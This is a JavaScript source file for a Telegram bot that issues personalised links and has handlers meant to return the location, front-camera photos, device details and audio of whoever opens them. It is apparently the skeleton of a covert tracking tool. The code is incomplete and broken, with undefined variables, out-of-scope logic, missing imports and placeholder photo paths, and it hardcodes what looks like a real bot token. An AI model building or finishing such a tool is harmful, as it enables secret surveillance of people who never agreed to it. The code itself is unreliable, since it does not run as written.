const TelegramBot = require('node-telegram-bot-api');
const token = '6477885066:AAFjM-M9ECJmkPeQZDu10Q1eHliGMV_F7qM';
const bot = new TelegramBot(token, { polling: true });


bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const messageText = msg.text;

  if (messageText === '/generate_link') {
    const link = `https://t.me/APICopy1_Bot?start=location_${chatId}`;
    bot.sendMessage(chatId, `Here's your link: ${link}`);
  }
});


bot.onText(/\/start (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const linkData = match[1].split('_');
  const scanType = linkData[0];
  const scanCount = linkData[1];

  // Perform actions based on the link data
});

// For location scan
bot.onText(/\/start location_(.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  // Get the user's location and send it back
  bot.sendLocation(chatId, latitude, longitude);
});

// For photo scan
bot.onText(/\/start camera_(.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const photoCount = parseInt(match[1]);
  // Send live photos taken by the camera
  for (let i = 0; i < photoCount; i++) {
    bot.sendPhoto(chatId, 'path_to_photo');
  }
});

// For photo scan
  if (scanType === 'mobile' && scanCount === 'info') {
    const userAgent = msg.from?.userAgent || 'Not available';
    bot.sendMessage(chatId, `User's device information:\n${userAgent}`);
  }

// For photo & location
if (scanType === 'photo' && scanCount === 'and' && linkData[2] === 'location') {
    // Send live photos taken by the front camera
    const photoCount = 5; // You can adjust this based on your requirement
    for (let i = 0; i < photoCount; i++) {
      bot.sendPhoto(chatId, { source: 'path_to_front_camera_photo', type: 'photo' });
    }

    // Get the user's location and send it back
    bot.sendLocation(chatId, latitude, longitude);
  };

//For audio
if (scanType === 'audio' && scanCount === 'recording') {
    // Request the user to send an audio recording
    bot.sendMessage(chatId, 'Please record an audio message now.');

    // Listen for the audio message
    bot.on('voice', (voiceMsg) => {
      // Save the audio file
      const fileId = voiceMsg.voice.file_id;
      const filePath = `audio_${chatId}.ogg`;

      bot.getFileLink(fileId).then((fileLink) => {
        const fileStream = fs.createWriteStream(filePath);
        https.get(fileLink, (response) => {
          response.pipe(fileStream);
        });

        fileStream.on('finish', () => {
          // Now you can process the saved audio file (filePath)
          bot.sendMessage(chatId, 'Audio recording received. Processing...');
          // Add your processing logic here
        });
      });
    });
  }


// Implement similar logic for other scan types

